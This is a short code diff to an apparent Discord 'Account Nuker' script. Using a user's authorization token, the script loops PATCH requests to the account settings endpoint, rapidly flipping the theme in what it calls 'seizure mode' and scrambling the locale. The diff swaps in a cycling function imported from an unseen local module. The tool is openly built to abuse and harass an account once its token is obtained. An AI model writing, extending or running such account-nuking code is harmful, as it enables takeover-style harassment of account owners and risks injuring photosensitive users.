@@ -2,6 +2,7 @@ import os, sys, time, requests, os.path, threading, random
 from colorama import Fore
 from util.plugins.commun import * 
 from atio import main
+from util.settingscycler.settingscycler import cyclecolortheme
 
 
 setTitle("Account Nuker")
@@ -94,7 +95,7 @@ def accnuke():
         print(f'{y}[{w}+{y}]{w} Starting seizure mode (Switching on/off Light/dark mode)')
         t = threading.currentThread()
         while getattr(t, "do_run", True):
-            modes = cycle(["light", "dark"])
+            modes = cyclecolortheme(["light", "dark"])
             setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
             requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)
 
